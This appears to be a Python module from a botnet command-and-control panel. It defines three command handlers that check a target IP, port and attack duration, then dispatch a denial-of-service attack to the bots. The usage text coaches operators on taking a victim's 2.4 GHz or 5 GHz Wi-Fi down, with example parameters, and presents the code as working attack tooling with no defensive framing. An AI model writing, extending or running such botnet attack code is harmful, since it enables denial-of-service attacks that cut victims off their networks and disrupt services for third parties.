from colorama import Fore

def wifi_crash(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data):
    if len(args) == 5:
        ip = args[1]
        port = args[2]
        secs = args[3]
        if validate_ip(ip):
            if validate_port(port):
                if validate_time(secs):
                    send(client, ansi_clear, False)
                    attack_sent1(ip, port, secs, client)
                    broadcast(data)
                else:
                    send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
            else:
                send(client, Fore.RED + 'Invalid port number (1-65535)')
        else:
            send(client, Fore.RED + 'Invalid IP-address')
    else:
        send(client, 'Usage: .WIFI_RESOURCES [IP] [PORT] [TIME] [NUMBER_ATTACK]')
        send(client, 'MAKE BOTNET DOWN !!! !Not Make Target Down!')
        send(client, "")
        send(client, "Example command to get wifi down all time")
        send(client, '')
        send(client, '.WIFI_RESOURCES [IP] [PORT] 150 150 <--------- wifi 2.4 g down!')
        send(client, 'wifi 2.4 g < if ping in bot can back to connect because timeout to send dos wifi')
        send(client, '')
        send(client, '.WIFI_RESOURCES [IP] [PORT] 2500 2500 <--------- wifi 5 g')
        send(client, "wifi 5g can connect but ping high ms! or can't connect")
        send(client, "i don't know how to wifi 5g get can't connect all time")

def wifi_crash2(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data):
    if len(args) == 5:
        ip = args[1]
        port = args[2]
        secs = args[3]
        if validate_ip(ip):
            if validate_port(port):
                if validate_time(secs):
                    send(client, ansi_clear, False)
                    attack_sent1(ip, port, secs, client)
                    broadcast(data)
                else:
                    send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
            else:
                send(client, Fore.RED + 'Invalid port number (1-65535)')
        else:
            send(client, Fore.RED + 'Invalid IP-address')
    else:
        send(client, 'Usage: .WIFI_UNREACHABLE [IP] [PORT] [TIME] [NUMBER_ATTACK]')
        send(client, 'MAKE BOTNET DOWN !!! !Not Make Target Down!')
        send(client, "")
        send(client, "THIS METHOD CAN GIVE YOU PING GET Destination net unreachable After end send")

def wifi_crash3(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data):
    if len(args) == 5:
        ip = args[1]
        port = args[2]
        secs = args[3]
        if validate_ip(ip):
            if validate_port(port):
                if validate_time(secs):
                    send(client, ansi_clear, False)
                    attack_sent1(ip, port, secs, client)
                    broadcast(data)
                else:
                    send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
            else:
                send(client, Fore.RED + 'Invalid port number (1-65535)')
        else:
            send(client, Fore.RED + 'Invalid IP-address')
    else:
        send(client, 'Usage: .WIFI_REUN [IP] [PORT] [TIME] [NUMBER_ATTACK]')
        send(client, 'MAKE BOTNET DOWN !!! !Not Make Target Down!')